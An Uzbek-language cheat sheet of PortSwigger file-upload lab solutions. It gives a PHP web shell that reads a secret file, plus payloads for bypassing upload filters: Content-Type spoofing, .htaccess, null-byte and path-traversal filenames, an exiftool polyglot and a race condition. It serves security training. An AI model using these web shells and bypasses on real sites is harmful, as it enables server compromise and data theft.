# File Upload — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**. Nishon: avatar upload orqali PHP web shell yuklab, `/home/carlos/secret` o'qish.
> Web shell: `<?php echo file_get_contents('/home/carlos/secret'); ?>`. Yuklangach `/files/avatars/exploit.php` ni GET qilasan.

### RCE via web shell upload — APPRENTICE
Filtr yo'q — to'g'ridan `.php` yuklaysan.
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
```
GET /files/avatars/exploit.php
```

### Content-Type restriction bypass — APPRENTICE
Faqat image MIME ruxsat → upload so'rovida `Content-Type` ni soxtalashtirasan.
```
Content-Type: image/jpeg      (fayl ichida PHP)
```

### Extension blacklist bypass (.htaccess) — PRACTITIONER
`.php` bloklangan → `.htaccess` bilan custom kengaytmani PHP'ga map qilasan.
```
.htaccess  (Content-Type: text/plain):
AddType application/x-httpd-php .l33t
```
> Keyin `exploit.l33t` yukla → `GET /files/avatars/exploit.l33t`.

### Obfuscated file extension (null byte) — PRACTITIONER
`.jpg` kerak → null byte bilan kesasan.
```
filename="exploit.php%00.jpg"
```
> Server `%00.jpg` ni olib tashlab `exploit.php` saqlaydi.

### Path traversal — PRACTITIONER
Upload papkasi PHP ishlatmaydi → `../` bilan boshqa papkaga chiqasan.
```
filename="..%2fexploit.php"
```
> `/files/avatars/` dan `/files/` ga chiqadi → `GET /files/exploit.php`.

### Polyglot web shell (PHP-JPG) — PRACTITIONER
Image content tekshiriladi → exiftool bilan JPG metadata'ga PHP joylaysan.
```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" input.jpg -o polyglot.php
```
> `polyglot.php` yukla → javobda `START ... END` orasida secret.

### Race condition — PRACTITIONER
Fayl validatsiyadan oldin saqlanadi, fail bo'lsa o'chiriladi → shu oynada o'qiysan.
```
Turbo Intruder: POST upload (exploit.php) + ~5 GET /files/avatars/exploit.php
→ gate bilan birga jo'nat → 200 javobda secret (o'chirilgunga qadar)
```

---

### Eslatma
Bypass arsenali (README'da to'liq): Content-Type, blacklist (`.phtml`, `.php5`), `.htaccess`,
null byte, path traversal, polyglot, race, double extension, magic bytes. Himoya: allowlist,
rename, upload papkasida execute off. Umumiy: bu papka README.
